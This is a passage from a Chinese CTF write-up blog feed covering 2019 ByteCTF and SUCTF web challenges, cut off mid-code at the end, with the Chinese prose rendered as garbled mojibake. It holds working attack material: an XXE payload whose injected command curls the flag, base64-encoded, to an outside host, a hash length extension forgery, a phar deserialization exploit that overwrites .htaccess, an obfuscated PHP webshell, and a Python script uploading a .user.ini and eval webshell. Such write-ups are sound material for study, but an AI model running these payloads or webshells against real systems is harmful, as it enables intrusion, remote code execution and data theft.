text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://112.126.96.50:9999/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">rss_url=http://z3r0yu.bytebaidu.com:2233/exp7.xml</span><br></pre></td></tr></table></figure><p>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!ENTITY test SYSTEM "http://localhost/rss_in_order?rss_url=http%3a%2f%2f47.90.204.28%3a2233%2ffile.xml&amp;order=description%2c%22c%22)%3b%7dsystem(%22curl+http%3a%2f%2f47.90.204.28%3a2233%2f%60cat%20%2fflag_eb8ba2eb07702e69963a7d6ab8669134%20%7c%20base64%60%22)%3b%2f%2f"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line">Â  Â  <span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">title</span>&gt;</span>å…ˆçŸ¥å®‰å…¨æŠ€æœ¯ç¤¾åŒº<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">description</span>&gt;</span>å…ˆçŸ¥å®‰å…¨æŠ€æœ¯ç¤¾åŒº<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">atom:link</span> <span class="attr">href</span>=<span class="string">"http://xz.aliyun.com/forum/feed/"</span> <span class="attr">rel</span>=<span class="string">"self"</span>&gt;</span><span class="tag">&lt;/<span class="name">atom:link</span>&gt;</span></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">language</span>&gt;</span>zh-hans<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Tue, 02 Jul 2019 06:03:00 +0800<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/5514<span class="tag">&lt;/<span class="name">link</span>&gt;</span><span class="tag">&lt;<span class="name">description</span>&gt;</span>åˆ©ç”¨Excel power queryå®ç°è¿œç¨‹DDEæ‰§è¡Œ<span class="tag">&lt;/<span class="name">description</span>&gt;</span><span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Tue, 02 Jul 2019 06:03:00 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span><span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/5514<span class="tag">&lt;/<span class="name">guid</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>CVE-2019-0221â€”Apache Tomcat SSI printenvæŒ‡ä»¤ä¸­çš„XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/5310<span class="tag">&lt;/<span class="name">link</span>&gt;</span><span class="tag">&lt;<span class="name">description</span>&gt;</span>CVE-2019-0221â€”Apache Tomcat SSI printenvæŒ‡ä»¤ä¸­çš„XSS<span class="tag">&lt;/<span class="name">description</span>&gt;</span><span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Jun 2019 09:09:00 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span><span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/5310<span class="tag">&lt;/<span class="name">guid</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/14/ZeRuhaHM8xNiFws.png" alt="58C0EE14-8370-49B4-85A6-EF1B67EDB1ED.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytectf&#123;61878fa75f293f179a895bf74e358a4f&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-ezcms"><a href="#0x03-ezcms" class="headerlink" title="0x03 ezcms"></a>0x03 ezcms</h2><h4 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://112.126.102.158:9999" target="_blank" rel="noopener">http://112.126.102.158:9999</a></p><h4 id="é¢˜ç›®è§£ç­”-2"><a href="#é¢˜ç›®è§£ç­”-2" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæºç æ³„éœ²<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">112.126.102.158:9999/www.zip</span><br></pre></td></tr></table></figure></p><p>çœ‹åˆ°<code>config.php</code>ä¸­çš„<code>is_admin</code>å‡½æ•°æ—¶ï¼Œå°±åŸºæœ¬å¯ä»¥åˆ¤æ–­ï¼Œæ­¤å¤„å¯ä»¥ä½¿ç”¨hashæ‰©å±•æ”»å‡»bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">"admin"</span> &amp;&amp; $password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.$username.$password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çš„ä¸€èˆ¬åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>çŸ¥é“<code>md5($secret.$username.$password)</code>çš„å€¼</li><li>çŸ¥é“<code>$SECRET</code>çš„é•¿åº¦</li><li>æˆ‘ä»¬å¯ä»¥ç®—å‡ºå¦å¤–ä¸€ä¸ª md5 å€¼å’Œå¦å¤–ä¸€ä¸ªuserçš„å€¼ï¼Œä½¿å¾—<code>$COOKIE[&#39;user&#39;] == md5($secret.$username.$password)</code></li></ul><p>æ‰€ä»¥é¦–å…ˆè¾“å…¥ä»»æ„å¯†ç ç™»å½•ååœ¨cookieä¸­è·å–åˆ°å¯¹åº”çš„hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.cookie</span><br><span class="line">&quot;PHPSESSID=bodvgts7e1v6duqtcvq0miplul; hash=b1a9c01292d57c0d2010add7f8d10c41&quot;</span><br></pre></td></tr></table></figure></p><p>ä¹‹åï¼Œå› ä¸ºè¦ä¼ªé€ çš„passwordçš„å€¼ä¸ºadminï¼Œæ‰€ä»¥å¯¹åº”çš„é•¿åº¦æ˜¯ len($SECRET)+len($password)=13</p><p>æœ€åä½¿ç”¨<code>hashpump</code>ä¼ªé€ å¾—åˆ°å¯¹åº”çš„å€¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: b1a9c01292d57c0d2010add7f8d10c41</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: zeroyu</span><br><span class="line">f27536145794288b2c1f94f0a62695a9</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00zeroyu</span><br></pre></td></tr></table></figure></p><p>ä¹‹åå°†<code>\x</code>æ¢ä¸º<code>%</code>å³å¯å¾—åˆ°å¯¹åº”çš„payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00zeroyu</span><br></pre></td></tr></table></figure></p><p>ä¹‹åå°±å¯ä»¥ç”¨adminçš„èº«ä»½æ¥ä¸Šä¼ æ–‡ä»¶äº†</p><p>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œwebappæ˜¯è‡ªå·±ç”Ÿæˆäº†ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶æ¥é˜»æ­¢å¯¹æˆ‘ä»¬shellçš„è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è¦†ç›–æˆ–è€…åˆ é™¤è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œæºç ä¸­æœ‰ç±»ï¼Œè¿˜æœ‰ä¸€ä¸ªç–‘ä¼¼å¯ä»¥è§¦å‘pharååºåˆ—åŒ–çš„ç‚¹ï¼ŒåŸºæœ¬å°±å¯ä»¥åˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å¤§æ¦‚çœ‹äº†ä¸€ä¸‹å®˜æ–¹æ‰‹å†Œï¼Œå‘ç° <code>mime_content_type</code> å‡½æ•°çš„å®ç°ï¼Œå…¶å®ä¹Ÿæ˜¯é€šè¿‡è¯»å–å¯¹åº”çš„æ–‡ä»¶æ¥å®ç°çš„ï¼Œæ—¢ç„¶è¯»æ–‡ä»¶å°±æœ‰å¯èƒ½ä¼šè§¦å‘pharå‘åºåˆ—åŒ–æ¼æ´ï¼Œä¹‹åæœ¬åœ°æµ‹è¯•å‘ç°çš„ç¡®å¯ä»¥è§¦å‘ã€‚</p><p>å‰é¢çš„åè®®é™åˆ¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®æ¥è¿›è¡Œç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath)</span><br></pre></td></tr></table></figure></p><p>å¯¹åº”çš„ç»•è¿‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://filename.phar</span><br></pre></td></tr></table></figure></p><p>ä¹‹åå°±æ˜¯æ‰¾ä¸€æ¡popé“¾æ¥å®Œæˆå¯¹<code>.htaccess</code>çš„ä¿®æ”¹ï¼Œæœ€å¼€å§‹æƒ³ä½¿ç”¨<code>move_uploaded_file</code>å‡½æ•°å°†æ–‡ä»¶ç§»èµ°ï¼Œä½†æ˜¯åé¢å‘ç°<code>move_uploaded_file</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯postä¼ é€’çš„ï¼Œå› æ­¤å¤±è´¥ã€‚</p><p>åé¢å°±å…³æ³¨åˆ°Profileç±»<code>__call</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è™½ç„¶webappè‡ªèº«æ²¡æœ‰æä¾›å¯¹åº”çš„å‡½æ•°ï¼Œä½†æ˜¯phpç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªç±»å¯ä»¥å®Œæˆæ–‡ä»¶ä¿®æ”¹çš„æ•ˆæœï¼Œæ‰€ä»¥é¡ºç€è¿™ä¸ªæ€è·¯å°±æ‰¾åˆ°äº†<code>ZipArchive::open</code> <a href="https://www.php.net/manual/zh/ziparchive.open.php" target="_blank" rel="noopener">å¯¹åº”çš„æ‰‹å†Œè¯´æ˜</a></p><p>æ‰€ä»¥æœ€ç»ˆæ„é€ å‡ºçš„expå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$o-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$o-&gt;checker-&gt;admin=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">$o-&gt;checker-&gt;username=<span class="string">"./sandbox/f528764d624db129b32c21fbca0cb8d6/.htaccess"</span>;</span><br><span class="line">$o-&gt;checker-&gt;password=ZIPARCHIVE::OVERWRITE;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä¹‹åæˆ‘ä»¬æœ¬åœ°åŠ¨æ€è°ƒè¯•ä¸€ä¸‹è¿™ä¸ªé“¾ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å·²ç»è§¦å‘äº†çš„ï¼Œå¹¶ä¸”è§¦å‘ä¹‹å<code>.htaccess</code>æ–‡ä»¶ä¹Ÿè¢«ä¿®æ”¹äº†</p><p><img src="https://i.loli.net/2019/09/14/QmRkhdI68wvWUGn.png" alt="3E7D9164-1ACB-4322-ABC8-544705C9BF73.png"></p><p>ä¹‹åæˆ‘ä»¬ä¹‹åéœ€è¦ä¸Šä¼ ä¸€ä¸ªbypassé™åˆ¶çš„webshellï¼Œç„¶åå†è§¦å‘ååºåˆ—åŒ–åˆ æ‰<code>.htaccess</code>æ–‡ä»¶å³å¯getshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$z=<span class="string">"sys"</span>.<span class="string">"tem"</span>;</span><br><span class="line">$z($_GET[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/7RdApN51tFYBfQ3.png" alt="7D460532-3282-48EA-B2DE-24FA7B419C1E.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;å‘¨æœ«çš„æ¯”èµ›è´¨é‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œç‰¹åˆ«æ˜¯boring_codeï¼Œæœ‰ç‚¹çƒ§è„‘ä½†æ˜¯åšçš„å°±å¾ˆå¼€å¿ƒã€‚&lt;/p&gt;
&lt;p&gt;æ–‡
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 suctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/</id>
    <published>2019-09-05T13:47:20.000Z</published>
    <updated>2019-09-05T14:08:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åˆæ˜¯å¾ˆå—¨çš„ä¸€åœºæ¯”èµ›ã€‚</p><p>PS: è¡¥å……äº†iCloudMusicçš„ä¸ªäººè¯¦ç»†é¢˜è§£</p><h2 id="0x01-CheckIn"><a href="#0x01-CheckIn" class="headerlink" title="0x01 CheckIn"></a>0x01 CheckIn</h2><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://47.111.59.243:9021" target="_blank" rel="noopener">http://47.111.59.243:9021</a></p><h4 id="é¢˜ç›®è§£ç­”"><a href="#é¢˜ç›®è§£ç­”" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>é¦–å…ˆåˆ¤æ–­ç›®æ ‡é¢˜ç›®çš„å®¹å™¨ç¯å¢ƒï¼Œå‘ç°æ˜¯nginxè€Œä¸æ˜¯apache</p><p>ä¹‹åå‘ç°ä¸Šä¼ ç‚¹å…·æœ‰å¦‚ä¸‹ç‰¹å¾ï¼š</p><ol><li><code>.php</code> åç¼€çš„ä¸å¯ä»¥</li><li><code>&lt;?</code> ä¸å¯ä»¥å‡ºç°</li><li><code>exif_imagetype</code> æ£€éªŒæ˜¯å¦æ˜¯å›¾ç‰‡</li></ol><p>é‚£ä¹ˆå°±é€ç‚¹bypass;</p><ol><li><p>ä¸å…è®¸phpåç¼€çš„æƒ…å†µä¸‹å°±è¦è€ƒè™‘å®¹å™¨çš„ç‰¹æ€§<br>å®¹å™¨æ˜¯å¦å­˜åœ¨è§£ææ¼æ´æˆ–è€…å…¶ä»–ï¼Œå¦‚æœæ˜¯apacheçš„è¯æˆ‘ä»¬å®Œå…¨å¯ä»¥å…ˆä¸Šä¼ <code>.htaccess</code>æ¥å°†æŸä¸ªåç¼€å½“åšphpè„šæœ¬è§£ææ‰§è¡Œï¼Œä½†æ˜¯æ­¤å¤„æ˜¯nginxå®¹å™¨ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä¹Ÿæ²¡æœ‰å¯¹åº”çš„è§£ææ¼æ´ï¼Œå› æ­¤è€ƒè™‘<code>.user.ini</code>æ¥æ„é€ è§£æ<br>è¿™ä¸ªå¯ä»¥å‚è€ƒï¼š<a href="https://wooyun.js.org/drops/user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨.html" target="_blank" rel="noopener">ã€Šuser.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨ã€‹</a></p></li><li><p>ä¸å…è®¸<code>&lt;?</code> é‚£ä¹ˆå°±è€ƒè™‘<code>&lt;script language=&#39;php&#39;&gt;</code></p></li><li><code>exif_imagetype</code> æ ¡éªŒbypass<br>è¿™ä¸ªå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937</a></li></ol><p>æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹getshellè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9021/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">auto_prepend_file = cc.jpg</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"&lt;?php eval($_GET['c']);?&gt;")</span></span><br><span class="line">shell =  <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span> + <span class="string">"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'.user.ini'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">print(<span class="string">"upload .user.ini"</span>)</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line"></span><br><span class="line">print(r.text) </span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload cc.jpg"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'cc.jpg'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/0ec1db6cfe0333559b8991ce81e48662/index.php?c=system(%27cat%20/flag%27); HTTP/1.1</span><br><span class="line">Host: 47.111.59.243:9021</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Sat, 17 Aug 2019 02:28:39 GMT</span><br><span class="line">If-None-Match: &quot;5d576657-74&quot;</span><br></pre></td></tr></table></figure><p>ç›´æ¥catå¾—åˆ°flag<br><img src="https://i.loli.net/2019/09/05/dBIaK6tqOmZuYrk.png" alt="CDE4B672-51B6-4029-B4F6-12E88C73D62D.png"></p><h2 id="0x02-EasyPHP"><a href="#0x02-EasyPHP" class="headerlink" title="0x02 EasyPHP"></a>0x02 EasyPHP</h2><h4 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://47.111.59.243:9001/" target="_blank" rel="noopener">http://47.111.59.243:9001/</a></p><h4 id="é¢˜ç›®è§£ç­”-1"><a href="#é¢˜ç›®è§£ç­”-1" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>è®¿é—®ç«™ç‚¹ç›´æ¥å¾—åˆ°ç½‘ç«™å¯¹åº”çš„æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = 